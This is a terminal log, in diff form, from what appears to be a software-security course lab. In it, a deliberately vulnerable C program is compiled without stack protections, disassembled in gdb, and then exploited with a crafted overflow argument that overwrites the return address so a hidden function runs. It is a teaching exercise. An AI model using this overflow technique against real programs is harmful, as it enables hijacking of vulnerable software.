@@ -1,0 +1,83 @@
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gcc deadcode.c -o deadcode -mpreferred-stack-boundary=2 -fno-stack-protector -zexecstack -g
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gdb deadcode -q
+Reading symbols from deadcode...done.
+(gdb) info functions
+All defined functions:
+
+File deadcode.c:
+void copy(char *);
+void dead();
+int main(int, char **);
+
+Non-debugging symbols:
+0x080482cc  _init
+0x08048300  strcpy@plt
+0x08048310  puts@plt
+0x08048320  __libc_start_main@plt
+0x08048340  _start
+0x08048370  __x86.get_pc_thunk.bx
+0x08048380  deregister_tm_clones
+0x080483b0  register_tm_clones
+0x080483f0  __do_global_dtors_aux
+0x08048410  frame_dummy
+0x08048490  __libc_csu_init
+0x080484f0  __libc_csu_fini
+0x080484f4  _fini
+(gdb) disass main
+Dump of assembler code for function main:
+   0x0804846c <+0>:	push   %ebp
+   0x0804846d <+1>:	mov    %esp,%ebp
+   0x0804846f <+3>:	mov    0xc(%ebp),%eax
+   0x08048472 <+6>:	add    $0x4,%eax
+   0x08048475 <+9>:	mov    (%eax),%eax
+   0x08048477 <+11>:	push   %eax
+   0x08048478 <+12>:	call   0x804844e <copy>
+   0x0804847d <+17>:	add    $0x4,%esp
+   0x08048480 <+20>:	mov    $0x0,%eax
+   0x08048485 <+25>:	leave  
+   0x08048486 <+26>:	ret    
+End of assembler dump.
+(gdb) disass copy
+Dump of assembler code for function copy:
+   0x0804844e <+0>:	push   %ebp
+   0x0804844f <+1>:	mov    %esp,%ebp
+   0x08048451 <+3>:	sub    $0x94,%esp
+   0x08048457 <+9>:	pushl  0x8(%ebp)
+   0x0804845a <+12>:	lea    -0x91(%ebp),%eax
+   0x08048460 <+18>:	push   %eax
+   0x08048461 <+19>:	call   0x8048300 <strcpy@plt>
+   0x08048466 <+24>:	add    $0x8,%esp
+   0x08048469 <+27>:	nop
+   0x0804846a <+28>:	leave  
+   0x0804846b <+29>:	ret    
+End of assembler dump.
+(gdb) disass dead
+Dump of assembler code for function dead:
+   0x0804843b <+0>:	push   %ebp
+   0x0804843c <+1>:	mov    %esp,%ebp
+   0x0804843e <+3>:	push   $0x8048510
+   0x08048443 <+8>:	call   0x8048310 <puts@plt>
+   0x08048448 <+13>:	add    $0x4,%esp
+   0x0804844b <+16>:	nop
+   0x0804844c <+17>:	leave  
+   0x0804844d <+18>:	ret    
+End of assembler dump.
+(gdb) run enpm
+Starting program: /home/user/Documents/ENPM-691/C Programs/deadcode enpm
+[Inferior 1 (process 4404) exited normally]
+(gdb) run enpm
+Starting program: /home/user/Documents/ENPM-691/C Programs/deadcode enpm
+[Inferior 1 (process 4410) exited normally]
+(gdb) run $(python -c 'print("A"*145 + "A"*4 + "\x3b\x84\x04\x08")')
+Starting program: /home/user/Documents/ENPM-691/C Programs/deadcode $(python -c 'print("A"*145 + "A"*4 + "\x3b\x84\x04\x08")')
+Deadcode activated
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbffff206 in ?? ()
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 4411] will be killed.
+
+Quit anyway? (y or n) y
+
